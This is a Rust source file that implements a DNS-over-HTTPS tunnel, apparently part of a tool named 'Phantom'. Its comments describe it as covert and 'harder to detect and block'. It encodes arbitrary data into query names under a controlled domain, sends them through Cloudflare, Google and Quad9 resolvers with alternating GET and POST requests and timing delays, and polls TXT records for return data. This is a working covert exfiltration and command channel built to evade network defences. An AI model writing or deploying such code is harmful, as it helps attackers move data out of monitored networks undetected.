//! DNS-over-HTTPS (DoH) tunneling implementation
//!
//! Uses encrypted HTTPS connections to DoH providers for covert DNS tunneling.
//! Harder to detect and block than traditional DNS tunneling.

use super::{encoding, Tunnel, TunnelError, TunnelStats};
use crate::config::PhantomConfig;
use async_trait::async_trait;
use reqwest::Client;
use std::str::FromStr;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use tracing::debug;
use trust_dns_proto::op::{Message, MessageType, OpCode, Query};
use trust_dns_proto::rr::{Name, RecordType};

/// DoH tunnel implementation
pub struct DohTunnel {
    client: Client,
    endpoint: String,
    domain: Name,
    chunk_size: usize,
    stats: Arc<DohStatsInner>,
    sequence: AtomicU64,
}

struct DohStatsInner {
    bytes_sent: AtomicU64,
    bytes_received: AtomicU64,
    requests_sent: AtomicU64,
    responses_received: AtomicU64,
    errors: AtomicU64,
}

impl DohTunnel {
    pub fn new(config: &PhantomConfig, domain: &str) -> Result<Self, TunnelError> {
        let client = Client::builder()
            .timeout(std::time::Duration::from_secs(30))
            .build()
            .map_err(|e| TunnelError::DohError(e.to_string()))?;

        let domain_name = Name::from_str(domain)
            .map_err(|e| TunnelError::DohError(format!("Invalid domain: {}", e)))?;

        Ok(Self {
            client,
            endpoint: config.tunnel.doh_endpoint.clone(),
            domain: domain_name,
            chunk_size: config.tunnel.dns_chunk_size,
            stats: Arc::new(DohStatsInner {
                bytes_sent: AtomicU64::new(0),
                bytes_received: AtomicU64::new(0),
                requests_sent: AtomicU64::new(0),
                responses_received: AtomicU64::new(0),
                errors: AtomicU64::new(0),
            }),
            sequence: AtomicU64::new(0),
        })
    }

    /// Build a DNS query packet using trust-dns-proto
    fn build_dns_query(&self, name_str: &str, record_type: RecordType) -> Result<Vec<u8>, TunnelError> {
        let mut msg = Message::new();
        
        let tx_id = self.sequence.fetch_add(1, Ordering::Relaxed) as u16;
        msg.set_id(tx_id)
           .set_message_type(MessageType::Query)
           .set_op_code(OpCode::Query)
           .set_recursion_desired(true);

        let name = Name::from_str(name_str)
            .map_err(|e| TunnelError::DohError(format!("Invalid name: {}", e)))?;
            
        msg.add_query(Query::query(name, record_type));

        msg.to_vec().map_err(|e| TunnelError::DohError(e.to_string()))
    }

    /// Parse DNS response from DoH using trust-dns-proto
    fn parse_dns_response(&self, response_data: &[u8]) -> Option<Vec<u8>> {
        let msg = match Message::from_vec(response_data) {
            Ok(m) => m,
            Err(e) => {
                debug!("Failed to parse DoH response: {}", e);
                return None;
            }
        };

        if msg.message_type() != MessageType::Response {
            return None;
        }

        // Look for answers
        for record in msg.answers() {
            if let Some(rdata) = record.data() {
                match rdata {
                    trust_dns_proto::rr::RData::TXT(txt) => {
                        let mut full_data = Vec::new();
                        for item in txt.txt_data() {
                            full_data.extend_from_slice(item);
                        }
                        return Some(full_data);
                    },
                    trust_dns_proto::rr::RData::CNAME(cname) => {
                         let s = cname.to_string();
                         if let Some(first_label) = s.split('.').next() {
                             if let Some(decoded) = encoding::decode_dns_label(first_label) {
                                 return Some(decoded);
                             }
                         }
                    }
                    _ => {}
                }
            }
        }

        None
    }

    /// Send DoH query using GET method (RFC 8484)
    async fn query_get(&self, dns_query: &[u8]) -> Result<Vec<u8>, TunnelError> {
        // base64url encoding without padding
        let encoded = encoding::encode_base64(dns_query);

        let url = format!("{}?dns={}", self.endpoint, encoded);

        let response = self
            .client
            .get(&url)
            .header("Accept", "application/dns-message")
            .send()
            .await
            .map_err(|e| TunnelError::DohError(e.to_string()))?;

        if !response.status().is_success() {
            return Err(TunnelError::DohError(format!(
                "DoH request failed: {}",
                response.status()
            )));
        }

        response
            .bytes()
            .await
            .map(|b| b.to_vec())
            .map_err(|e| TunnelError::DohError(e.to_string()))
    }

    /// Send DoH query using POST method (RFC 8484)
    async fn query_post(&self, dns_query: &[u8]) -> Result<Vec<u8>, TunnelError> {
        let response = self
            .client
            .post(&self.endpoint)
            .header("Content-Type", "application/dns-message")
            .header("Accept", "application/dns-message")
            .body(dns_query.to_vec())
            .send()
            .await
            .map_err(|e| TunnelError::DohError(e.to_string()))?;

        if !response.status().is_success() {
            return Err(TunnelError::DohError(format!(
                "DoH POST failed: {}",
                response.status()
            )));
        }

        response
            .bytes()
            .await
            .map(|b| b.to_vec())
            .map_err(|e| TunnelError::DohError(e.to_string()))
    }
}

#[async_trait]
impl Tunnel for DohTunnel {
    async fn send(&self, data: &[u8]) -> Result<(), TunnelError> {
        let encoded = encoding::encode_dns_label(data);
        // We use chunk_for_dns_encoded because 'encoded' is already a string
        let chunks = encoding::chunk_for_dns_encoded(&encoded, self.chunk_size);

        for (i, chunk) in chunks.iter().enumerate() {
            // Build query name: chunk.domain
            // Note: self.domain is a Name, we convert to string to append
            let query_name = format!("{:04x}{}.{}", i, chunk, self.domain);

            let dns_query = self.build_dns_query(&query_name, RecordType::TXT)?;

            self.stats.requests_sent.fetch_add(1, Ordering::Relaxed);
            self.stats
                .bytes_sent
                .fetch_add(dns_query.len() as u64, Ordering::Relaxed);

            // Send via DoH
            let response = if i % 2 == 0 {
                self.query_get(&dns_query).await?
            } else {
                self.query_post(&dns_query).await?
            };

            self.stats.responses_received.fetch_add(1, Ordering::Relaxed);
            self.stats
                .bytes_received
                .fetch_add(response.len() as u64, Ordering::Relaxed);

            debug!(
                "DoH query {}/{}: {} bytes response",
                i + 1,
                chunks.len(),
                response.len()
            );

            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }

        Ok(())
    }

    async fn receive(&self) -> Result<Vec<u8>, TunnelError> {
        // Query for poll.domain to get pending data
        let query_name = format!("poll.{}", self.domain);
        let dns_query = self.build_dns_query(&query_name, RecordType::TXT)?;

        // Use POST for polling to avoid caching
        let response = self.query_post(&dns_query).await?;

        if let Some(data) = self.parse_dns_response(&response) {
            // Try to decode
            if let Ok(s) = std::str::from_utf8(&data) {
                if let Some(decoded) = encoding::decode_base64(s) {
                     return Ok(decoded);
                }
            }
            return Ok(data);
        }

        Ok(Vec::new())
    }

    fn stats(&self) -> TunnelStats {
        TunnelStats {
            bytes_sent: self.stats.bytes_sent.load(Ordering::Relaxed),
            bytes_received: self.stats.bytes_received.load(Ordering::Relaxed),
            packets_sent: self.stats.requests_sent.load(Ordering::Relaxed),
            packets_received: self.stats.responses_received.load(Ordering::Relaxed),
            errors: self.stats.errors.load(Ordering::Relaxed),
        }
    }
}

/// List of public DoH providers
#[allow(dead_code)]
pub const DOH_PROVIDERS: &[(&str, &str)] = &[
    ("Cloudflare", "https://cloudflare-dns.com/dns-query"),
    ("Google", "https://dns.google/dns-query"),
    ("Quad9", "https://dns.quad9.net/dns-query"),
];

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_dns_query_building() {
        let config = PhantomConfig::default();
        let tunnel = DohTunnel::new(&config, "test.example.com").unwrap();

        let query = tunnel.build_dns_query("test.example.com", RecordType::A).unwrap();

        assert!(query.len() > 12);
        // trust-dns handles the format, so we trust it's correct if it compiled and ran
    }
}